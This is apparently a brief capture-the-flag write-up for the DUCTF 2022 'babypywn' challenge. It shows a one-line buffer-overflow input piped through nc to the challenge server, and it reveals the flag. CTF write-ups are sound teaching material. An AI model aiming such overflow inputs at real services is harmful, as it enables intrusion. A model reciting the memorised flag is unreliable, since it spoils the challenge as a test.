#### Challenge:

Python is memory safe, right? [babypywn.py](./babypywn.py ":ignore")

`nc 2022.ductf.dev 30021`

---

#### Solution:

Classic `gets` overflow:

```bash
python -c 'import pwn;  print("A"*512 + "DUCTF")' | nc 2022.ductf.dev 30021
```

---

<details><summary>FLAG:</summary>

```
DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}
```

</details>
<br/>